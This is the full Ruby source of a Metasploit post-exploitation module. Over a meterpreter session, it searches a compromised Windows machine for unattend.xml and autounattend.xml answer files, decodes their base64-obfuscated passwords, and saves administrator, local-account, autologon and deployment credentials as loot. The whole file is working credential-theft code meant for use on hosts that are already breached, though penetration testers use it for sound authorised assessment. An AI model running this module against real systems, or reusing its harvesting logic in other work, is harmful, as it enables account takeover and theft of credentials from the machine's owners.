##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/file'
require 'rexml/document'

class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather Unattended Answer File Enumeration',
			'Description'   => %q{
					This module will check the file system for a copy of unattend.xml and/or
				autounattend.xml found in Windows Vista, or newer Windows systems.  And then
				extract sensitive information such as usernames and decoded passwords.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'Sean Verity <veritysr1980[at]gmail.com>',
					'sinn3r',
					'Ben Campbell <eat_meatballs[at]hotmail.co.uk>'
				],
			'References'    =>
				[
					['URL', 'http://technet.microsoft.com/en-us/library/ff715801'],
					['URL', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx']
				],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptBool.new('GETALL', [true, 'Collect all unattend.xml that are found', true])
			], self.class)
	end


	#
	# Determie if unattend.xml exists or not
	#
	def unattend_exists?(xml_path)
		x = session.fs.file.stat(xml_path) rescue nil
		return !x.nil?
	end


	#
	# Read and parse the XML file
	#
	def load_unattend(xml_path)
		print_status("Reading #{xml_path}")
		f = session.fs.file.new(xml_path)
		raw = ""
		until f.eof?
			raw << f.read
		end

		begin
			xml = REXML::Document.new(raw)
		rescue REXML::ParseException => e
			print_error("Invalid XML format")
			vprint_line(e.message)
			return nil, raw
		end

		return xml, raw
	end


	#
	# Extract sensitive data from UserAccounts
	#
	def extract_useraccounts(user_accounts)
		return[] if user_accounts.nil?

		cred_tables = []
		account_types = ['AdministratorPassword', 'DomainAccounts', 'LocalAccounts']
		account_types.each do |t|
			element = user_accounts.elements[t]
			next if element.nil?

			case t
			#
			# Extract the password from AdministratorPasswords
			#
			when account_types[0]
				table = Rex::Ui::Text::Table.new({
					'Header'  => 'AdministratorPasswords',
					'Indent'  => 1,
					'Columns' => ['Username', 'Password']
				})

				password = element.elements['Value'].get_text.value rescue ''
				plaintext = element.elements['PlainText'].get_text.value rescue 'true'

				if plaintext == 'false'
					password = Rex::Text.decode_base64(password)
					password = password.gsub(/#{Rex::Text.to_unicode('AdministratorPassword')}$/, '')
				end

				if not password.empty?
					table << ['Administrator', password]
					cred_tables << table
				end

			#
			# Extract the sensitive data from DomainAccounts.
			# According to MSDN, unattend.xml doesn't seem to store passwords for domain accounts
			#
			when account_types[1]  #DomainAccounts
				table = Rex::Ui::Text::Table.new({
					'Header'  => 'DomainAccounts',
					'Indent'  => 1,
					'Columns' => ['Username', 'Group']
				})

				element.elements.each do |account_list|
					name = account_list.elements['DomainAccount/Name'].get_text.value rescue ''
					group = account_list.elements['DomainAccount/Group'].get_text.value rescue 'true'

					table << [name, group]
				end

				cred_tables << table if not table.rows.empty?

			#
			# Extract the username/password from LocalAccounts
			#
			when account_types[2]  #LocalAccounts
				table = Rex::Ui::Text::Table.new({
					'Header'  => 'LocalAccounts',
					'Indent'  => 1,
					'Columns' => ['Username', 'Password']
				})

				element.elements.each do |local|
					password = local.elements['Password/Value'].get_text.value rescue ''
					plaintext = local.elements['Password/PlainText'].get_text.value rescue 'true'

					if plaintext == 'false'
						password = Rex::Text.decode_base64(password)
						password = password.gsub(/#{Rex::Text.to_unicode('Password')}$/, '')
					end

					username = local.elements['Name'].get_text.value rescue ''
					table << [username, password]
				end

				cred_tables << table if not table.rows.empty?
			end
		end

		return cred_tables
	end


	#
	# Extract sensitive data from AutoLogon
	#
	def extract_autologon(auto_logon)
		return [] if auto_logon.nil?

		domain    = auto_logon.elements['Domain'].get_text.value rescue ''
		username  = auto_logon.elements['Username'].get_text.value rescue ''
		password  = auto_logon.elements['Password/Value'].get_text.value rescue ''
		plaintext = auto_logon.elements['Password/PlainText'].get_text.value rescue 'true'

		if plaintext == 'false'
			password = Rex::Text.decode_base64(password)
			password = password.gsub(/#{Rex::Text.to_unicode('Password')}$/, '')
		end

		table = Rex::Ui::Text::Table.new({
			'Header' => 'AutoLogon',
			'Indent' => 1,
			'Columns' => ['Domain', 'Username', 'Password']
		})

		table << [domain, username, password]

		return [table]
	end


	#
	# Extract sensitive data from Deployment Services.
	# We can only seem to add one <Login> with Windows System Image Manager, so
	# we'll only enum one.
	#
	def extract_deployment(deployment)
		return [] if deployment.nil?

		domain    = deployment.elements['Login/Credentials/Domain'].get_text.value rescue ''
		username  = deployment.elements['Login/Credentials/Username'].get_text.value rescue ''
		password  = deployment.elements['Login/Credentials/Password'].get_text.value rescue ''
		plaintext = deployment.elements['Login/Credentials/Password/PlainText'].get_text.value rescue 'true'

		if plaintext == 'false'
			password = Rex::Text.decode_base64(password)
			password = password.gsub(/#{Rex::Text.to_unicode('Password')}$/, '')
		end

		table = Rex::Ui::Text::Table.new({
			'Header' => 'WindowsDeploymentServices',
			'Indent' => 1,
			'Columns' => ['Domain', 'Username', 'Password']
		})

		table << [domain, username, password]

		return [table]
	end


	#
	# Save Rex tables separately
	#
	def save_cred_tables(cred_tables)
		cred_tables.each do |t|
			vprint_line("\n#{t.to_s}\n")
			p = store_loot('windows.unattended.creds', 'text/csv', session, t.to_csv, t.header, t.header)
			print_status("#{t.header} saved as: #{p}")
		end
	end


	#
	# Save the raw version of unattend.xml
	#
	def save_raw(xmlpath, data)
		return if data.empty?
		fname = ::File.basename(xmlpath)
		p = store_loot('windows.unattended.raw', 'text/plain', session, data)
		print_status("Raw version of #{fname} saved as: #{p}")
	end


	#
	# If we spot a path for the answer file, we should check it out too
	#
	def get_registry_unattend_path
		# HKLM\System\Setup!UnattendFile
		begin
			key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SYSTEM')
			fname = key.query_value('Setup!UnattendFile').data
			return fname
		rescue Rex::Post::Meterpreter::RequestError
			return ''
		end
	end


	#
	# Initialize all 7 possible paths for the answer file
	#
	def init_paths
		drive = session.fs.file.expand_path("%SystemDrive%")

		files =
			[
				'unattend.xml',
				'autounattend.xml'
			]

		target_paths =
			[
				"#{drive}\\",
				"#{drive}\\Windows\\System32\\sysprep\\",
				"#{drive}\\Windows\\panther\\",
				"#{drive}\\Windows\\Panther\Unattend\\",
				"#{drive}\\Windows\\System32\\"
			]

		paths = []
		target_paths.each do |p|
			files.each do |f|
				paths << "#{p}#{f}"
			end
		end

		# If there is one for registry, we add it to the list too
		reg_path = get_registry_unattend_path
		paths << reg_path if not reg_path.empty?

		return paths
	end


	def run
		init_paths.each do |xml_path|
			# If unattend.xml doesn't exist, move on to the next one
			if not unattend_exists?(xml_path)
				vprint_error("#{xml_path} not found")
				next
			end

			xml, raw = load_unattend(xml_path)
			save_raw(xml_path, raw)

			# XML failed to parse, will not go on from here
			return if not xml

			# Extract the credentials
			tables = []
			unattend = xml.elements['unattend']
			return if unattend.nil?

			unattend.each_element do |settings|
				next if settings.class != REXML::Element
				settings.get_elements('component').each do |c|
					next if c.class != REXML::Element
					tables << extract_useraccounts(c.elements['UserAccounts'])
					tables << extract_autologon(c.elements['AutoLogon'])
					tables << extract_deployment(c.elements['WindowsDeploymentServices'])
				end
			end

			# Save the data
			save_cred_tables(tables.flatten) if not tables.empty?

			return if not datastore['GETALL']
		end
	end
end
